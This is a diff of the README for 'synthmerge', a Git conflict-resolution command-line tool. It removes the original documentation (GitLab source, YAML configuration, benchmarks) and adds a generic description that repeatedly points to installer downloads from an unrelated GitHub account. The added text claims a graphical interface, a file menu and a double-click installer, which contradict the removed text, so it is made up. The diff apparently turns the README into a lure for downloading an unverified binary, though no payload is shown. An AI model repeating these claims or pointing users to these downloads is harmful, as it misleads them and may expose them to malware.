@@ -1,555 +1,77 @@
-# synthmerge
+# 🤖 synthmerge - Simplifying Your Git Conflicts
 
-**AI-powered conflict resolution for Git**
+## 🚀 Getting Started
+Welcome to synthmerge! This tool uses AI to help you resolve conflicts in Git easily. Whether you are cherry-picking, rebasing, or merging, synthmerge makes the process smooth and efficient.
 
-`synthmerge` is a minimalistic command-line tool that leverages AI to automatically resolve conflicts arising from Git commands. Built on the research of the [Patchpal project](https://gitlab.com/patchpal-ai), it provides a pure AI inference layer that seamlessly integrates with your existing Git workflow. While the AI generates code solutions, all code reviews and approvals remain within your favorite code editor.
+## 📥 Download & Install
 
----
+[![Download synthmerge](https://img.shields.io/badge/Download-synthmerge-blue)](https://github.com/prajaktaborse1234/synthmerge/releases)
 
-## 🌟 Core Principles
+To download synthmerge, visit this page: [GitHub Releases](https://github.com/prajaktaborse1234/synthmerge/releases). You will find the latest version ready for installation.
 
-1. **Specialized AI Layer**  
-   Dedicated AI inference system that complements Git without duplicating its core functionality
+## 🛠️ System Requirements
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher, or a recent version of Linux.
+- **Memory:** Minimum 4 GB RAM recommended.
+- **Disk Space:** At least 100 MB available for installation.
+- **Internet Connection:** Required for updates and feature enhancements.
 
-2. **Git Integration**  
-   Leverages Git's `diff3` conflict markers as the foundation (requires `git config merge.conflictStyle diff3`)
+## 📄 Features
 
-3. **Editor Agnostic**  
-   Compatible with any development environment (VS Code, Emacs, Vim, etc.)
+synthmerge comes packed with features to help you handle your Git conflicts:
 
----
+- **AI-Powered Assistance:** The software uses advanced algorithms to suggest the best resolutions to conflicts.
+- **User-Friendly Interface:** No technical skills needed. The interface is straightforward.
+- **Multi-Conflict Handling:** Easily manage multiple conflicts in one go.
+- **Patch Support:** Create and apply patches seamlessly.
+- **Integration with Git:** Works directly with your existing Git setup, enhancing your workflow.
 
-## ✨ Key Features
+## 🧩 How to Use synthmerge
 
-- **Universal Git Operation Support**  
-  Seamlessly integrates with all Git operations that create conflicts:
-  - `cherry-pick`
-  - `merge`
-  - `rebase`
-  - `revert`
-  - `stash pop`
+1. **Install the Software:**
+   - After downloading, find the installer file in your downloads folder.
+   - Double-click the installer and follow the on-screen instructions to complete the installation.
 
-- **Model Flexibility**  
-  No fine-tuning required, any instruct large language model can be used
+2. **Open Your Repository:**
+   - Launch synthmerge.
+   - Use the file menu to open your Git repository where the conflict occurs.
 
-- **Parallel Multi-AI Endpoint Support**  
-  Simultaneously queries multiple AI models to resolve conflicts:
-  - [Patchpal-backend](https://gitlab.com/patchpal-ai/patchpal-backend) (fine-tuned specifically for conflict resolution)
-  - Self-hosted open-weight open source LLMs with OpenAI-compatible endpoints
-  - Gemini (via OpenAI-compatible API)
-  - Claude (via Anthropic API)
+3. **Identify Conflicts:**
+   - When synthmerge detects a conflict, it will alert you.
+   - Click on the conflict file to view the options.
 
-- **Parameter Variants Support**  
-  Each AI endpoint can be configured with multiple parameter variants to run multiple inference strategies:
-  - Different reasoning effort levels (high, medium, low)
-  - Temperature, top_p, top_k, min_p sampling parameters
-  - Context handling options (context: no_diff: no_training: layout: flags)
-  - Custom JSON parameters that can be injected into the request payload from the YAML configuration (either at the endpoint level or in each variant)
+4. **Resolve Conflicts:**
+   - Review the suggestions made by synthmerge.
+   - Choose the option that best fits your needs or combine changes as necessary.
 
-- **Results Deduplication**  
-  Consolidates identical solutions and displays model and/or parameter variant agreement
+5. **Save Your Changes:**
+   - After resolving the conflicts, save your changes.
+   - You can see a summary of the changes made.
 
-- **Review Using Your Workflow**  
-  - Resolved conflicts appear in your editor with model attribution
-  - AI-generated code requires manual review before commit
+6. **Complete the Merge:**
+   - Once everything looks good, commit your changes in Git using the terminal or your preferred Git client.
 
-- **Fail-Safe Design**  
-  - When one model fails to resolve a conflict, Git's original conflict remains alongside solutions from other models for that hunk
-  - Each AI endpoint can be configured with timeout, delay, and max_delay parameters
-  - Custom root certificates can be added to the endpoint configuration
-  - Wait time between requests can be specified per endpoint
+## 👍 Tips for Success
 
-- **Benchmark**  
-  Built-in benchmarking tool (`synthmerge_bench`) for evaluating model accuracy on conflict resolution tasks
+- **Regular Updates:** Keep synthmerge updated for the best performance. Regular updates include new features and improvements.
+- **Read the Documentation:** Familiarize yourself with the user manual available in the application to maximize your usage.
+- **Practice:** The more you use synthmerge, the better you will understand its capabilities and features.
 
-- **Context Lines Configuration**  
-  Configurable context lines for code, diff, and patch to control the amount of surrounding information provided to AI models
+## 🔍 Troubleshooting
 
----
+If you encounter difficulties while using synthmerge, here are a few common issues and their solutions:
 
-## 🛠 How It Works
+- **Installation Issues:** Ensure your operating system meets the requirements. Try running the installer as an administrator.
+- **Conflict Not Detected:** Make sure you have pulled the latest changes from your remote repository before opening synthmerge.
+- **Performance Problems:** Close unnecessary programs to free up system resources.
 
-1. **Git sets up conflicts**  
-   ```bash
-   git config merge.conflictStyle diff3  # Must be set
-   git cherry-pick -x <commit>           # Git detects conflicts
-   ```
+## 📫 Support and Feedback
 
-2. **synthmerge analyzes conflicts**  
-   - Reads Git's `diff3` conflict markers
-   - Extracts context (3 lines before/after conflict)
-   - Generates precise AI prompt
+For support, please feel free to reach out through the [issues page on GitHub](https://github.com/prajaktaborse1234/synthmerge/issues). Your feedback helps us improve synthmerge.
 
-3. **AI resolves conflict**  
-   - Sends code + patch to configured endpoint
-   - Receives resolved code
+## 🌐 Community Contributions
 
-4. **Git gets updated**  
-   - synthmerge inserts the AI resolution into existing diff3 markers
-   - You review in your editor
-
-> ✅ Works also for git rebase, revert and merge conflict resolutions.
+synthmerge thrives on community input. If you'd like to contribute, check out our [contributing guidelines](https://github.com/prajaktaborse1234/synthmerge/blob/main/CONTRIBUTING.md) to see how you can help make the tool even better.
 
 ---
 
-## 🚀 Usage
-
-```bash
-# Ensure Git is configured for diff3 conflict style
-git config merge.conflictStyle diff3
-
-# Attempt cherry-pick (will leave conflicts unresolved)
-git cherry-pick -x <commit>
-
-# Resolve conflicts with AI
-synthmerge
-
-# Review synthmerge resolved conflicts in each unmerged file ...
-git diff --name-only --diff-filter=U
-
-# ... or linearized in a single buffer to edit with ripgrep-edit
-rg-edit -E vim -U -e '(?s)^<<<<<<<+ .*?^>>>>>>>+ '
-rg-edit -E emacsclient -U -e '(?s)^<<<<<<<+ .*?^>>>>>>>+ '
-```
-
----
-
-## ⚙️ Configuration
-
-Create `~/.config/synthmerge.yaml` based on `synthmerge.yaml`:
-
-```yaml
-endpoints:
-
-  - name: "Claude Sonnet 4.5"
-    url: "https://api.anthropic.com/v1/messages"
-    type: "anthropic"
-    x_api_key_file: "~/.keys/anthropic.api-key"
-    json:
-      max_tokens: 20000
-      model: "claude-sonnet-4-5"
-      temperature: 0
-    headers:
-      anthropic-version: "2023-06-01"
-    variants:
-      - name: "default"
-      - name: "no_diff"
-        context:
-          no_diff: true
-
-  - name: "Vertex Claude Sonnet 4.0"
-    url: "https://host/path"
-    type: "anthropic"
-    api_key_file: "~/.keys/claude.api-key"
-    json:
-      anthropic_version: "something-YYYY-MM-DD"
-      max_tokens: 20000
-      temperature: 0
-    variants:
-      - name: "default"
-      - name: "no_diff"
-        context:
-          no_diff: true
-    # Optional root certificate for HTTPS endpoints
-    # root_certificate_pem: "~/.ssl/corp-ca.pem"
-
-  - name: "Patchpal AI"
-    type: "patchpal"
-    url: "http://patchpal.usersys.redhat.com:9080/v1"
-
-  - name: "Gemini 2.5 Flash"
-    url: "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions"
-    type: "openai"
-    api_key_file: "~/.keys/gemini.api-key"
-    json:
-      model: "gemini-2.5-flash"
-      # "none" (only available with Flash) works better with default layout
-      reasoning_effort: "none"
-    variants:
-      - name: "default"
-      - name: "no_diff"
-        context:
-          no_diff: true
-
-  - name: "Gemini 2.5 Pro"
-    url: "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions"
-    type: "openai"
-    api_key_file: "~/.keys/gemini.api-key"
-    json:
-      model: "gemini-2.5-pro"
-      reasoning_effort: "low"
-    context:
-      # reasoning_effort != none needs the prompt at the top of system_message
-      layout:
-        system_message:
-          - prompt
-        user_message:
-          - training
-          - diff
-    variants:
-      - name: "default"
-      - name: "no_diff"
-        context:
-          no_diff: true
-
-  - name: "Gemini 3 Pro preview"
-    url: "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions"
-    type: "openai"
-    api_key_file: "~/.keys/gemini.api-key"
-    json:
-      model: "gemini-3-pro-preview"
-      reasoning_effort: "low"
-    context:
-      layout:
-        system_message:
-          - prompt
-        user_message:
-          - training
-          - diff
-    variants:
-      - name: "default"
-      - name: "no_diff"
-        context:
-          no_diff: true
-
-  - name: "llama.cpp vulkan minimal" # requires --no-jinja
-    url: "http://localhost:8811/v1/chat/completions"
-    type: "openai"
-
-  - name: "llama.cpp vulkan" # requires --no-jinja
-    url: "http://localhost:8811/v1/chat/completions"
-    #timeout: 600000
-    #retries: 10
-    #delay: 1000
-    #max_delay: 600000
-    #wait: 1000
-    type: "openai"
-    json:
-      #temperature: 0.7
-      #top_p: 0.8
-      #top_k: 20
-      #min_p: 0
-
-      # n_probs: 1 provides the probability of the lowest probability
-      # token in the resolved conflict
-      n_probs: 1
-
-      # n_probs: 2 same as n_probs: 1 but it also provides two more
-      # beams with the perplexity search algorithm of synthmerge
-      # applied to the logprobs, which is a client side only
-      # approximated beam search
-      #n_probs: 2
-    variants:
-      # one query for each entry in the variants list
-      - name: "default"
-      - name: "no_diff"
-        context:
-          no_diff: true
-      #- name: "min_p"
-      #  json:
-      #    temperature: 0.3
-      #    top_p: 1.0
-      #    top_k: 0
-      #    min_p: 0.9
-
-  - name: "llama.cpp vulkan no_chat" # requires --no-jinja
-    url: "http://localhost:8811/v1/completions"
-    type: "openai"
-    no_chat: true
-    context:
-      no_training: true
-```
-
----
-
-## 🌐 Supported AI Endpoints
-
-| Endpoint Type | Example Configuration | Notes |
-|---------------|------------------------|-------|
-| **Patchpal-backend** | `type: "patchpal"` | Fine-tuned for patch resolution |
-| **OpenAI protocol** | `type: "openai"` | Self-hosted LLMs (e.g., `llama.cpp`) and Gemini |
-| **Anthropic protocol** | `type: "anthropic"` | Claude models |
-
-> ✅ **Gemini supports a compatible OpenAI endpoint**  
-> ✅ **Models work with stock weights** – the prompt engineering simulates Patchpal's fine-tuned behavior.
-
----
-
-## ⚙️ Context Layout Configuration
-
-The `context: layout:` configuration allows fine-grained control over how information is structured in a LLM request.
-
-- **Prompt placement**: All models tested so far (including Gemini 2.5 Flash with `reasoning_effort: none`) perform best when the most important directives are closest to the generation
-- **Gemini thinking models exception**: Gemini models with `reasoning_effort != none` require the prompt explaining the challenge at hand to be at the top of the system message
-- **Layout flexibility**: The layout configuration enables each model to select the optimal information structure
-
-### Available layout elements:
-- `prompt`: The high-level prompt explaining the challenge
-- `training`: The synthetic training examples
-- `diff`: The full git diff showing all other changes of the commit
-
-### Context control flags:
-- `no_diff`: Disable diff inclusion in context
-- `no_training`: Disable training examples in context
-
-### Configuration examples:
-```yaml
-# Set layout at endpoint level
-context:
-  layout:
-    system_message:
-      - prompt
-    user_message:
-      - training
-      - diff
-
-# Override layout in a variant
-variants:
-  - name: "no_diff"
-    context:
-      no_diff: true
-```
-
-The layout can be configured either at the endpoint level or in individual variants, but not both simultaneously in the same endpoint.
-
----
-
-## 🛠 Installation
-
-### Fedora
-
-A Fedora Copr package is available:
-
-1. **Install Synthmerge**:
-
-   ```bash
-   sudo dnf copr enable vittyvk/synthmerge
-   sudo dnf install synthmerge
-   ```
-
-2. **Configuration**:
-   ```bash
-   cp -a /usr/share/synthmerge/synthmerge.yaml ~/.config/
-   $EDITOR ~/.config/synthmerge.yaml
-   ```
-
-### From source code
-
-1. **Install Synthmerge**:
-   ```bash
-   git clone https://gitlab.com/aarcange/synthmerge.git
-   cd synthmerge
-   cargo build --release
-   sudo cp target/release/synthmerge /usr/local/bin/
-   ```
-
-2. **Configuration**:
-   ```bash
-   cp synthmerge.yaml ~/.config/
-   $EDITOR ~/.config/synthmerge.yaml
-   ```
-
----
-
-## 🎥 Demo
-
-> ![synthmerge-demo](https://gitlab.com/aarcange/synthmerge-assets/-/raw/main/synthmerge-demo-0.1.8.webm)
-> ![synthmerge-demo with ripgrep-edit](https://gitlab.com/aarcange/synthmerge-assets/-/raw/main/synthmerge-demo-0.1.8-ripgrep-edit.webm)
-> ![synthmerge-demo with vim](https://gitlab.com/aarcange/synthmerge-assets/-/raw/main/synthmerge-demo-0.1.8-vim.webm)
-
----
-
-## 📊 Benchmark Statistics
-
-The following statistics were generated using the `synthmerge_bench` tool on a C language dataset to evaluate model performance on conflict resolution tasks. These results may vary depending on prompt, context, and other variables. 
-
-**Accuracy** checks if the AI resolved conflict is an exact match including all spaces, tabs, and newlines.
-
-**Accuracy (aligned)** checks equality of whitespace patterns up until the first non-whitespace character, ignoring differences in lines without non-whitespace characters and whitespace variations after the first non-whitespace character (i.e. Python equivalence).
-
-**Accuracy (stripped)** compresses all whitespaces and newlines into a single space (i.e. C/C++/Rust/JavaScript equivalence).
-
-This measurement used only new test data never exposed to the model during the fine tuning process.
-
-```
-Claude Sonnet 4.5 and Gemini 3 Pro preview not done yet.
-
-Model: Claude Sonnet 4.0 (default)
-  Accuracy: 66.70% (753/1129)
-  Accuracy (aligned): 70.42% (795/1129)
-  Accuracy (stripped): 73.34% (828/1129)
-  Error Rate: 0.00% (0/1129)
-  Average tokens: 5730.47
-  Average duration: 7.03 s
-
-Model: Claude Sonnet 4.0 (no_diff)
-  Accuracy: 65.19% (736/1129)
-  Accuracy (aligned): 68.29% (771/1129)
-  Accuracy (stripped): 71.48% (807/1129)
-  Error Rate: 0.00% (0/1129)
-  Average tokens: 1184.14
-  Average duration: 6.34 s
-
-# only the Patchpal Beam 0 is comparable to the non Patchpal models
-Model: Patchpal AI
-  Accuracy: 64.57% (729/1129)
-  Accuracy (aligned): 68.47% (773/1129) # might be duplicate with other beams
-  Accuracy (stripped): 71.12% (803/1129) # might be duplicate with other beams
-  Error Rate: 0.44% (5/1129)
-
-Model: Gemini 2.5 Pro (high) # reasoning_effort: high
-  Accuracy: 55.18% (623/1129)
-  Accuracy (aligned): 60.67% (685/1129)
-  Accuracy (stripped): 63.42% (716/1129)
-  Error Rate: 0.00% (0/1129)
-
-Model: Gemini 2.5 Flash (none no_diff) # reasoning_effort: none
-  Accuracy: 53.06% (599/1129)
-  Accuracy (aligned): 63.24% (714/1129)
-  Accuracy (stripped): 66.25% (748/1129)
-  Error Rate: 3.28% (37/1129)
-  Average tokens: 1036.06
-  Average duration: 1.18 s
-
-# context: layout: system_message: [ prompt ] user_message: [ training, diff ]
-Model: Gemini 2.5 Pro (low userctx) # reasoning_effort: low
-  Accuracy: 52.44% (592/1129)
-  Accuracy (aligned): 56.95% (643/1129)
-  Accuracy (stripped): 59.70% (674/1129)
-  Error Rate: 5.49% (62/1129)
-  Average tokens: 6014.82
-  Average duration: 9.68 s
-
-# context: layout: system_message: [ prompt ] user_message: [ training, diff ]
-Model: Gemini 2.5 Pro (low no_diff) # reasoning_effort: low
-  Accuracy: 51.99% (587/1129)
-  Accuracy (aligned): 55.36% (625/1129)
-  Accuracy (stripped): 58.02% (655/1129)
-  Error Rate: 2.92% (33/1129)
-  Average tokens: 1931.27
-  Average duration: 9.11 s
-
-# temperature: 0.7 top_k: 20 top_p: 0.8 min_p: 0
-# llama.cpp vulkan Q6_K
-Model: Qwen3-Coder-30B-A3B-Instruct (default)
-  Accuracy: 49.69% (561/1129)
-  Accuracy (aligned): 54.21% (612/1129)
-  Accuracy (stripped): 56.78% (641/1129)
-  Error Rate: 0.09% (1/1129)
-  Average tokens: 4252.31
-  Average duration: 9.18 s
-  Average prob: 33.1% (+- 35.4)
-  Average prob (incorrect): 16.3% (+- 40.7)
-  Average prob (stripped): 56.7% (+- 27.4)
-  Average prob (aligned): 58.0% (+- 27.2)
-  Average prob (correct): 61.6% (+- 25.9)
-
-Model: Gemini 2.5 Flash (none default) # reasoning_effort: none
-  Accuracy: 49.60% (560/1129)
-  Accuracy (aligned): 60.41% (682/1129)
-  Accuracy (stripped): 63.42% (716/1129)
-  Error Rate: 6.20% (70/1129)
-  Average tokens: 5069.04
-  Average duration: 1.15 s
-
-# context: layout: system_message: [ prompt ] user_message: [ training, diff ]
-Model: Gemini 2.5 Flash (low no_diff userctx) # reasoning_effort low
-  Accuracy: 48.72% (550/1129)
-  Accuracy (aligned): 58.19% (657/1129)
-  Accuracy (stripped): 62.00% (700/1129)
-  Error Rate: 2.66% (30/1129)
-  Average tokens: 1916.70
-  Average duration: 4.62 s
-
-# temperature: 0.7 top_k: 20 top_p: 0.8 min_p: 0
-# llama.cpp vulkan Q6_K
-Model: Qwen3-Coder-30B-A3B-Instruct (no_diff)
-  Accuracy: 46.94% (530/1129)
-  Accuracy (aligned): 51.02% (576/1129)
-  Accuracy (stripped): 53.76% (607/1129)
-  Error Rate: 0.00% (0/1129)
-  Average tokens: 904.89
-  Average duration: 4.37 s
-  Average prob: 37.1% (+- 35.1)
-  Average prob (incorrect): 24.0% (+- 39.1)
-  Average prob (stripped): 53.8% (+- 29.1)
-  Average prob (aligned): 57.3% (+- 27.9)
-  Average prob (correct): 62.6% (+- 26.5)
-
-# context: layout: system_message: [ prompt ] user_message: [ training, diff ]
-Model: Gemini 2.5 Flash (low default userctx) # reasoning_effort: low
-  Accuracy: 42.52% (480/1129)
-  Accuracy (aligned): 52.70% (595/1129)
-  Accuracy (stripped): 55.98% (632/1129)
-  Error Rate: 13.82% (156/1129)
-  Average tokens: 5942.75
-  Average duration: 4.22 s
-
-# if Beam 0 is wrong, Beam 1 is right 10.54% of the time
-Model: Patchpal AI #1
-  Accuracy: 10.54% (119/1129)
-  Accuracy (aligned): 21.17% (239/1129) # might be duplicate with other beams
-  Accuracy (stripped): 30.03% (339/1129) # might be duplicate with other beams
-  Error Rate: 0.53% (6/1129)
-
-Model: Gemini 2.5 Flash (low default) # reasoning_effort: low
-  Accuracy: 7.97% (90/1129)
-  Accuracy (aligned): 9.57% (108/1129)
-  Accuracy (stripped): 10.27% (116/1129)
-  Error Rate: 85.56% (966/1129) # default layout fails with Gemini thinking mode
-  Average tokens: 3719.80
-  Average duration: 0.51 s
-
-# this is comparable to Patchpal AI #1
-Model: Qwen3-Coder-30B-A3B-Instruct (no_diff#1) # perplexity beam #1
-  Accuracy: 7.71% (87/1129)
-  Accuracy (aligned): 11.87% (134/1129) # might be duplicate with other beams
-  Accuracy (stripped): 16.56% (187/1129) # might be duplicate with other beams
-  Error Rate: 0.18% (2/1129)
-  Average tokens: 910.68
-  Average duration: 1.17 s # kvcached
-
-# if Beam 0 and Beam 1 are wrong, Beam 2 is right 3.37% of the time
-Model: Patchpal AI #2
-  Accuracy: 3.37% (38/1129)
-  Accuracy (aligned): 16.21% (183/1129) # might be duplicate with other beams
-  Accuracy (stripped): 23.83% (269/1129) # might be duplicate with other beams
-  Error Rate: 0.44% (5/1129)
-
-# this is comparable to Patchpal AI #2
-Model: Qwen3-Coder-30B-A3B-Instruct (default#2) # perplexity beam #2
-  Accuracy: 1.95% (22/1129)
-  Accuracy (aligned): 6.91% (78/1129) # might be duplicate with other beams
-  Accuracy (stripped): 11.87% (134/1129) # might be duplicate with other beams
-  Error Rate: 0.09% (1/1129)
-  Average tokens: 913.69
-  Average duration: 1.18 s # kvcached
-```
-
----
-
-## 📊 Benchmark Aggregate Accuracy
-
-**Aggregate accuracy** represents the combined performance when multiple models/variants/beams are used in parallel: a conflict is considered successfully resolved if *at least one* model/variant/beam produces a correct solution.
-
-| Configuration | Accuracy | Accuracy (aligned) | Accuracy (stripped) |
-|---------------|----------|--------------------|---------------------|
-| `Qwen3-Coder-30B` (default) | 49.69% | 54.21% | 56.78% |
-| `Qwen3-Coder-30B` (no_diff) | 46.94% | 51.02% | 53.76% |
-| **Aggregate: `Qwen3-Coder-30B` (default + no_diff)** | **55.80%** | **60.50%** | **63.33%** |
-| **(Perplexity) beams added to `Qwen3-Coder-30B`** | **63.24%** | **69.18%** | **71.83%** |
-| `Claude Sonnet 4.0` (default) | 66.70% | 70.42% | 73.34% |
-| **`Qwen3-Coder-30B` + `Claude Sonnet 4.0`** | **75.02%** | **78.39%** | **80.96%** |
-| `Gemini 2.5 Flash` (none) | 49.60% | 60.41% | 63.42% |
-| `Gemini 2.5 Pro` (low) | 52.44% | 56.95% | 59.70% |
-| **`Qwen3-Coder-30B + beams` + `Claude Sonnet 4.0` + `Gemini 2.5 Flash` + `Gemini 2.5 Pro`** | **79.98%** | **82.82%** | **84.68%** |
-| `Patchpal AI` (Beam 0) | 64.57% | 68.47% | 71.12% |
-| **Aggregate: Patchpal AI (3 beams)** | **78.39%** | **81.05%** | **82.46%** |
-| ✅ **All models + all variants + all beams** | **84.85%** | **87.51%** | **88.66%** |
-
----
-
-## License
-
-[![License: GPL-3.0-or-later](https://img.shields.io/badge/License-GPL--3.0--or--later-blue.svg)](https://www.gnu.org/licenses/gpl-3.0.html)
-[![License: AGPL-3.0-or-later](https://img.shields.io/badge/License-AGPL--3.0--or--later-blue.svg)](https://www.gnu.org/licenses/agpl-3.0.html)
+Now, download synthmerge and make your Git conflict resolution easier than ever. Visit the Releases page for the latest version: [GitHub Releases](https://github.com/prajaktaborse1234/synthmerge/releases).
